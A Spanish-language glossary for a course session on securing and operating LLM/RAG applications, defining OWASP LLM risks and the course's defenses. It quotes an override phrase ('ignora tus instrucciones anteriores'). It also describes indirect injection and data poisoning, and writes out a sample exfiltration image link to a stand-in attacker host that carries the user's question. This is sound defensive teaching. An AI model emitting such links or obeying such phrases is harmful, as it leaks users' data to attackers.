# Glosario - S06
## Seguridad y operación

> Los términos de la sesión 6, en orden alfabético.

---

## A

### Agencia excesiva
**Categoría:** Seguridad / OWASP LLM06
**Definición:** Darle a un modelo más permisos, más funciones o más autonomía de los que su tarea necesita. Si el modelo se equivoca o lo manipulan, el daño posible es el de todos esos permisos juntos.
**En el curso:** se contiene con herramientas de lectura separadas de las de escritura, con la confirmación humana de `crear_ticket` (S04) y con los scopes del servidor MCP (S05).

---

### API falsa
**Categoría:** Pruebas
**Definición:** Un `HttpMessageHandler` que contesta como la API real con respuestas fijas, sin red. Permite probar el peor caso (un modelo que sí cayó en un ataque) sin llave, sin costo y con el mismo resultado cada vez.
**En el curso:** `DefensaDeSalidaIntegracion` le pasa al `AnthropicClient` un `HttpClient` con la API falsa y exige que el enlace del atacante no llegue a la respuesta.

---

## C

### Cuarentena
**Categoría:** Seguridad / Ingesta
**Definición:** Estado de un documento que el filtro de ingesta marcó como sospechoso: no se indexa hasta que una persona lo revisa y lo aprueba. La cuarentena no decide si el documento es malo; decide quién tiene que mirarlo.
**En el curso:** el comando `ingestar` escribe `cuarentena.md` con la huella y los hallazgos de cada documento retenido.

---

## D

### Dato envenenado
**Categoría:** Seguridad / OWASP LLM04
**Definición:** Información falsa o manipulada que entra a los datos de un sistema y que este da por buena, sin necesidad de instrucciones para el modelo. En RAG es especialmente eficaz, porque responder con los documentos es el trabajo del asistente.
**En el curso:** `contacto.md`, que da un correo de soporte falso; pasa la ingesta y lo contiene el filtro de salida.

---

### Defensa determinista
**Categoría:** Seguridad / Diseño
**Definición:** Una defensa escrita en código que se comporta igual cada vez y no depende de que el modelo obedezca. Para la clase de salida que controla, lleva la tasa de ataque a cero; no entiende el significado de lo que filtra.
**En el curso:** el filtro de salida, el escape del contexto y la cuarentena. Se prueban con pruebas unitarias, sin llave.

---

### Defensas en capas
**Categoría:** Seguridad / Diseño
**Definición:** Varias defensas independientes en distintos puntos del flujo, de modo que lo que una no detecta lo detenga otra. Ninguna capa es suficiente sola, y cada una se prueba por separado.
**En el curso:** ingesta, umbral de recuperación, contexto delimitado, prompt v2, validación de citas, filtro de salida y confirmación humana.

---

### Delimitadores de contexto
**Categoría:** Prompts / Seguridad
**Definición:** Etiquetas que separan en el mensaje lo que es dato de lo que es instrucción, por ejemplo `<documento clave="F12">`. Solo sirven si el contenido se escapa, para que un dato no pueda cerrar su etiqueta y escribir fuera de ella.
**En el curso:** `ConstruirContexto` envuelve cada fragmento en `<documento>` y escapa `<`, `>`, `&` y comillas.

---

## E

### Evaluación continua
**Categoría:** Operación / Calidad
**Definición:** Correr un juego de casos con umbral de forma automática y repetida: en cada cambio relevante y en un horario fijo. Detecta que la calidad bajó aunque nadie haya tocado el código, por ejemplo cuando el proveedor cambia un modelo.
**En el curso:** `.github/workflows/evals.yml` corre `EvalExtraccion`, `EvalRag` y `EvalAtaqueIndirecto` en los pull requests y cada lunes.

---

### Exfiltración por imagen
**Categoría:** Seguridad / Ataques
**Definición:** Técnica en la que se logra que el modelo escriba una imagen Markdown cuya URL lleva datos de la conversación. Al pintar la respuesta, el navegador descarga la imagen solo y los datos llegan al servidor del atacante sin que nadie haga clic.
**En el curso:** la instrucción oculta de `reembolsos.md` lo intenta con `![estado](https://registro.atacante.example/r?q=PREGUNTA)`.

---

## F

### Falso positivo
**Categoría:** Seguridad / Medición
**Definición:** Un caso legítimo que una defensa marca como ataque. Unos cuantos son el precio de detectar; demasiados hacen que la gente apruebe sin revisar y la defensa deje de servir.
**En el curso:** la nota `10-seguridad-llm.md` cae en cuarentena porque trae ataques de ejemplo; se aprueba por huella, con revisión.

---

### Filtro de ingesta
**Categoría:** Seguridad / RAG
**Definición:** Revisión de cada documento antes de indexarlo, en busca de contenido oculto (comentarios HTML, caracteres de ancho cero) o de texto que parece una instrucción para el modelo. Lo que encuentra va a cuarentena.
**En el curso:** `FiltroDeIngesta.Revisar`, con patrones medidos contra las notas reales del curso.

---

### Filtro de salida
**Categoría:** Seguridad / Salida
**Definición:** Revisión determinista de la respuesta del modelo antes de entregarla: quita imágenes Markdown y retira enlaces y correos de dominios que no están en la lista permitida. Registra cada retiro.
**En el curso:** `FiltroDeSalida.Filtrar`, aplicado al final de `AsistenteDocumentos.PreguntarAsync`.

---

### Fuga del prompt de sistema
**Categoría:** Seguridad / OWASP LLM07
**Definición:** Que el texto del prompt de sistema llegue a manos de un usuario, o que contenga secretos que no debería. La postura segura es suponer que el prompt es público y no poner en él llaves, contraseñas ni reglas que solo protejan si nadie las lee.
**En el curso:** la marca interna de la sesión 2 detecta la fuga; la autorización vive en el código, no en el prompt.

---

## I

### Inyección de prompt directa
**Categoría:** Seguridad / OWASP LLM01
**Definición:** Instrucciones que la propia persona que usa el sistema escribe para cambiar el comportamiento del modelo, por ejemplo "ignora tus instrucciones anteriores".
**En el curso:** el caso `ext-07` de la sesión 2, detenido por el validador y por el campo `intentaDarOrdenes`.

---

### Inyección de prompt indirecta
**Categoría:** Seguridad / OWASP LLM01
**Definición:** Instrucciones que llegan dentro de un dato que el sistema lee (un documento, un correo, un ticket, una página web) y no de la persona que pregunta. Quien la escribió nunca habló con el sistema, y quien pregunta ni la ve.
**En el curso:** el comentario HTML de `reembolsos.md`, en la práctica.

---

## L

### Lista de dominios permitidos
**Categoría:** Seguridad / Salida
**Definición:** Los dominios a los que la aplicación sí puede enlazar. Un host pasa si es uno de ellos o un subdominio suyo; cualquier otro, incluidos los que solo se parecen o los que empiezan con un dominio permitido, se retira.
**En el curso:** `OpcionesRag(DominiosPermitidos: ["academia.example"])` y `Dominios.Permitido`.

---

### LLM como juez
**Categoría:** Evaluación
**Definición:** Usar un modelo para calificar las respuestas de otro cuando una regla no alcanza, por ejemplo para saber si dos respuestas dicen lo mismo con otras palabras. Requiere pregunta cerrada, criterio explícito, salida estructurada y calibración contra calificaciones humanas.
**En el curso:** el fragmento `Juez.CalificarAsync`, con un `Veredicto` estructurado.

---

## O

### OpenTelemetry
**Categoría:** Operación / Observabilidad
**Definición:** Estándar abierto para trazas, métricas y registros. Una traza une los pasos de una petición (la llamada HTTP, la consulta a la base, la llamada al modelo) con sus tiempos.
**En el curso:** el SDK de C# de Anthropic emite trazas con la fuente `com.anthropic.sdk.csharp*`; por omisión se registran metadatos, no el contenido de los mensajes.

---

### OWASP Top 10 para aplicaciones con LLM
**Categoría:** Seguridad / Referencias
**Definición:** La lista del proyecto OWASP con los diez riesgos principales de las aplicaciones que usan modelos de lenguaje. La edición 2025 va de LLM01 Prompt Injection a LLM10 Unbounded Consumption.
**En el curso:** el mapa de la sesión 6: cada riesgo se ubica en una parte del proyecto, con su defensa.

---

## R

### Regresión deliberada
**Categoría:** Evaluación / Pruebas
**Definición:** Un cambio que empeora el sistema a propósito, en una rama aparte, para comprobar que la evaluación lo detecta. Una evaluación que nunca se vio en rojo no se sabe si funciona.
**En el curso:** la tarea pide un prompt v3 o un umbral absurdo que ponga el job de CI en rojo.

---

### Respaldo del lado del servidor
**Categoría:** API de Claude / Operación
**Definición:** Opción en beta de la API de Claude por la que, si el modelo pedido declina por política (`stop_reason` igual a `refusal`), la misma llamada se reintenta en otro modelo. Para Sonnet 5.5 se usa la forma `"default"` con la beta `server-side-fallback-2026-07-01`, solo en la API de Claude; Haiku 5.5 no lo tiene.
**En el curso:** el fragmento `Respaldo.ConRespaldoAsync`. Un rechazo se registra como métrica, con o sin respaldo.

---

### Riesgo residual
**Categoría:** Seguridad / Gestión
**Definición:** Lo que sigue pudiendo pasar después de aplicar las defensas. Decirlo con honestidad es parte de la defensa: indica qué otro control, técnico o de proceso, lo tiene que contener.
**En el curso:** `contacto.md` todavía pide datos de pago aunque el correo se retire; lo contiene quién puede publicar en el índice.

---

## S

### Salida insegura
**Categoría:** Seguridad / OWASP LLM05
**Definición:** Usar la salida del modelo sin validarla: pintarla como HTML o Markdown con imágenes remotas, ejecutarla como código o concatenarla en SQL. La salida del modelo es una entrada no confiable para lo que sigue.
**En el curso:** el filtro de salida, y en la sesión 4 un SQL fijo y parametrizado en el que el modelo solo elige valores.

---

## T

### Tasa de ataque
**Categoría:** Seguridad / Medición
**Definición:** La fracción de intentos en que un ataque logra su efecto, medida repitiendo la misma entrada varias veces. Con modelos que resisten muchas inyecciones, un intento que falla no prueba nada; un ataque que pasa una vez de cada diez sí pasa.
**En el curso:** las dos tablas de la práctica, antes y después de las defensas, y las repeticiones de `EvalAtaqueIndirecto`.

---

### Tope de gasto
**Categoría:** Operación / OWASP LLM10
**Definición:** Un límite de costo que se consulta antes de llamar al modelo y se carga con el costo real después. Se pone en varios niveles: por llamada, por corrida, por usuario y día, y por organización.
**En el curso:** `LimitesAgente` (S04), `TopeDeGasto` por usuario (S06) y el límite de gasto de la llave del curso.
